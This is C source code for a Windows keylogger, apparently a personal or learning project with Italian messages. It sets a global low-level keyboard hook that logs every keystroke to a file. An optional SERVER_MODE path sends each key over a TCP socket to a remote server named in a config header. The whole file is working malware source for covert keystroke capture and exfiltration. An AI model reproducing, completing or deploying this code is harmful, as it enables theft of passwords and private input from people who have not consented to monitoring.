#include <stdio.h>
#include <WinUser.h>
#include <stdlib.h>
#include <signal.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include "config.h"

#define WIN32_LEAN_AND_MEAN
#define DEFAULT_PORT "27015" // Port as a string for `getaddrinfo`
#define DEFAULT_BUFLEN 512
#define SERVER_MODE 0

#pragma comment(lib, "ws2_32.lib")

HHOOK hHook = NULL; // Handle for the keyboard hook
FILE *f;
SOCKET clientSocket;
int end;

void SignalHandler(int signal)
{
    if (signal == SIGINT)
    {
        printf("I got a signit");
    }
    else
    {
        printf("i got another sing");
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        // Print the key code (note: %c may not work for all key codes)
        printf("Tasto premuto: %c (Codice VK: %lu)\n", (char)vkCode, vkCode);
        fputc((char)vkCode, f); // Cast to char to avoid unexpected output

#if SERVER_MODE
        int iResult;
        char buf[16];
        sprintf(buf, "%c", (char)vkCode); // Convert vkCode to a string and store in buf
        // Sleep(1000);
        iResult = send(clientSocket, buf, (int)strlen(buf), 0);
        if (iResult == SOCKET_ERROR)
        {
            printf("send failed: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            WSACleanup();
            return 1;
        }
#endif
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL)
    {
        printf("Errore nell'impostazione dell'hook! Codice errore: %lu\n", GetLastError());
    }
    else
    {
        printf("Hook impostato con successo. Handle dell'hook: %lu\n", (unsigned long)hHook);
    }
}

void ReleaseHook()
{
    if (hHook)
    {
        UnhookWindowsHookEx(hHook);
    }
}

// Function to create and connect a client socket
SOCKET CreateSocket(void)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    const char *sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(SERVER_NAME, DEFAULT_PORT, &hints, &result);
    if (iResult != 0)
    {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                               ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET)
        {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    // Get the server name
    char hostname[NI_MAXHOST];
    iResult = gethostname(hostname, NI_MAXHOST);
    if (iResult == SOCKET_ERROR)
    {
        printf("gethostname failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("Server name is: %s\n", hostname);

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    return ConnectSocket;
}

int main(int argc, char *argv[])
{
    end = 0;

    typedef void (*SignalHandlerPointer)(int);

    SignalHandlerPointer previousHandler;
    previousHandler = signal(SIGINT, SignalHandler);

    printf("Inizializzazione key logger...\n");

    f = fopen("test.txt", "w");
    if (f == NULL)
    {
        printf("Errore nell'apertura del file!\n");
        return 1;
    }

#if SERVER_MODE
    clientSocket = CreateSocket();
    if (clientSocket == INVALID_SOCKET)
    {
        printf("Errore nella creazione del socket client.\n");
        fclose(f);
        return 1;
    }
#endif

    SetHook();
    printf("Premi i tasti (CTRL+C per uscire):\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0 && end != 1)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();

#if SERVER_MODE

    closesocket(clientSocket);
    WSACleanup();
#endif

    fclose(f);
    return 0;
}
